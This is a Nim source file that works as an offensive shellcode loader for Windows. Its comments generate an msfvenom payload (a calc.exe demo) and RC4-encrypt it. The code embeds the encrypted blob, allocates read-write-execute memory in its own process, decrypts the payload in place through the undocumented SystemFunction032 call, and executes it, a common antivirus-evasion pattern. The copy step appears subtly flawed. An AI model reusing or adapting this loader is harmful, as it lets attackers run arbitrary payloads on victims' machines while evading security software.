import winim
import winim/lean

# msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
# cat calc.bin | openssl enc -rc4 -nosalt -k "aaaaaaaaaaaaaaaa" > enccalc.bin
const encstring = slurp"enccalc.bin"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc SystemFunction032*(memoryRegion: pointer, keyPointer: pointer): NTSTATUS 
  {.discardable, stdcall, dynlib: "Advapi32", importc: "SystemFunction032".}

type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID

var keyString: USTRING
var imgString: USTRING

var keyBuf: array[16, char] = [char 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']

keyString.Buffer = cast[PVOID](&keyBuf)
keyString.Length = 16
keyString.MaximumLength = 16

var shellcode = toByteSeq(encstring)
var size  = len(shellcode)

let tProcess = GetCurrentProcessId()
echo "Current Process ID: ", tProcess
var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
echo "Process Handle: ", repr(pHandle)
let rPtr = VirtualAllocEx(
    pHandle,
    NULL,
    cast[SIZE_T](size),
    MEM_COMMIT,
    PAGE_EXECUTE_READ_WRITE
)

echo "Allocated Memory: ", repr(rPtr)
#echo "Pointer", toHex(rPtr)
echo "repr", repr(rPtr)
copyMem(rPtr, addr shellcode, size)

imgString.Buffer = rPtr
imgString.Length = cast[DWORD](size)
imgString.MaximumLength = cast[DWORD](size)

SystemFunction032(&imgString, &keyString)
#echo "Pointer", toHex(imgString)
echo "repr", repr(imgString)

let f = cast[proc(){.nimcall.}](rPtr)
f()
